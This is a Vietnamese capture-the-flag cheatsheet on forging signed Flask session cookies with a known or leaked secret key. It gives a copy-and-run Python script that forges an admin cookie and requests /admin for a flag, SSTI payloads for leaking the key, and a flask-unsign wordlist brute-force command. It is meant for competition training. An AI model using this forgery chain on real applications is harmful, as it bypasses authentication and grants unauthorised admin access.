# Session/Cookie Forge (tự ký cookie giả khi biết khoá bí mật)

Nhiều framework web (đặc biệt Flask) không lưu thông tin đăng nhập ở server — nó ghép thẳng dữ liệu (ví dụ "tôi là user nào, đã đăng nhập chưa") vào ngay trong cookie, rồi chỉ **ký** cookie đó bằng 1 khoá bí mật của app để chống bạn tự sửa. Cookie này giống 1 tờ giấy ghi thông tin kèm con dấu, không phải tờ giấy niêm phong — ai cũng đọc được nội dung (chỉ cần decode base64), chỉ không sửa được mà không bị phát hiện (vì con dấu/chữ ký sẽ sai). Nhưng nếu bạn biết được khoá bí mật đó (qua 1 lỗ hổng khác làm lộ ra, hoặc đoán được vì nó quá yếu), bạn tự ghép nội dung mới (`user: admin`) rồi tự đóng dấu lại đúng chuẩn — server không có cách nào phân biệt cookie "giả" này với cookie do chính nó tạo ra.

Trên Burp bạn nhận ra lỗi này khi: cookie tên `session` có dạng `eyJ....xxxxxxxx.yyyyyyyy` (2 dấu chấm, phần đầu là base64 của JSON) — khác JWT ở cấu trúc phần đầu, đây là định dạng riêng của thư viện Flask dùng (`itsdangerous`), không phải JWT chuẩn.

## Cài trước ngày thi (không có Internet lúc thi)

```bash
pip install flask flask-unsign
```

`flask-unsign` là tool dòng lệnh làm sẵn 3 việc: đọc nội dung cookie (không cần khoá), brute-force khoá bằng wordlist, và tự ký cookie mới khi đã biết khoá. Script dưới dùng trực tiếp thư viện `flask` (`itsdangerous` đi kèm sẵn) để làm tương tự ngay trong Python, không cần gọi tool ngoài.

## Snippet copy-là-chạy

```python
import re

import requests
from flask.sessions import SecureCookieSessionInterface

base = "http://target"
s = requests.Session()
s.verify = False

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-fA-F]{64}\}")

# SECRET_KEY lấy được qua 1 lỗ hổng khác (SSTI đọc {{config}}, LFI đọc file config.py,
# hoặc brute-force bằng wordlist nếu secret yếu) -- xem "Giải thích cho người mới"
SECRET_KEY = "khoa_da_tim_duoc"


class FakeApp:
    # itsdangerous chỉ cần đúng 1 thuộc tính secret_key để tính chữ ký -- không cần dựng
    # lại cả 1 app Flask thật
    secret_key = SECRET_KEY


def forge_cookie(data: dict) -> str:
    serializer = SecureCookieSessionInterface().get_signing_serializer(FakeApp())
    return serializer.dumps(data)


def solve_one(session, base_url):
    # Bước tính toán cục bộ: tự tạo 1 cookie session MỚI, không cần đăng nhập thật
    # (xem 02_Chuoi_Request/05_Tinh_Toan_Cuc_Bo.md về khái niệm "bước không gửi request")
    forged = forge_cookie({"user": "admin", "logged_in": True})
    print("cookie giả:", forged)  # in ra để kiểm tra nếu bước sau không ra flag

    try:
        r = session.get(f"{base_url}/admin", cookies={"session": forged}, timeout=5)
    except requests.RequestException:
        return None

    m = FLAG_RE.search(r.text)
    return m.group(0) if m else None


if __name__ == "__main__":
    print("Flag:", solve_one(s, base))
```

## Giải thích cho người mới

- **`SecureCookieSessionInterface().get_signing_serializer(FakeApp())`**: đây là đoạn mã dùng chính thư viện Flask để ký cookie — không tự viết thuật toán HMAC tay, vì Flask còn thêm 1 "salt" (muối — 1 chuỗi cố định trộn thêm vào trước khi ký) ngầm bên trong mà nếu tự ghép tay rất dễ quên, dẫn tới cookie bị từ chối dù secret đúng.
- **`FakeApp`**: chỉ là 1 class giả có đúng 1 thuộc tính `secret_key` — Flask chỉ cần cái này để tính chữ ký, không cần dựng nguyên 1 app Flask thật.
- **Cách tìm `SECRET_KEY`** (bắt buộc phải có trước khi dùng script này):
  - Qua SSTI (1 lỗ hổng khác, xem bài SSTI riêng nếu có trong bộ cheatsheet): gửi payload `{{config}}` hoặc `{{config['SECRET_KEY']}}`, nếu app dính SSTI thường lộ luôn giá trị này.
  - Qua LFI/source leak: đọc được file `app.py`/`config.py`, tìm dòng `app.secret_key = "..."`.
  - Brute-force bằng wordlist nếu secret là từ thông dụng (chạy cục bộ, không tốn request):
    ```bash
    flask-unsign --unsign --cookie "eyJ..." --wordlist ~/hoc/CTF/Tools/web/jwt_tool/jwt-common.txt
    ```
- `print("cookie giả:", forged)` — luôn in ra giá trị vừa tạo trước khi dùng, để biết lỗi nằm ở bước ký (sai secret, sai format) hay ở bước gửi request, đúng nguyên tắc debug đã nói ở `00_Bat_Dau_Tu_Zero.md` mục 4.

## Lưu ý nhanh

- Nếu server từ chối cookie mới, báo "session invalid": kiểm tra lại đúng `SECRET_KEY` (sai 1 ký tự là sai hoàn toàn), và chắc chắn dùng `SecureCookieSessionInterface` của Flask thật (như snippet trên) thay vì tự viết HMAC tay.
- Nếu không tìm được `SECRET_KEY` bằng cách nào: bài này không áp dụng được — phải tìm hướng khác (SSTI/LFI) trước, không có đường tắt.
- SECRET_KEY thường giống nhau ở mọi đội (vì cùng service, hardcode trong source) — tìm ra 1 lần là tái dùng được cho tất cả các đội.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
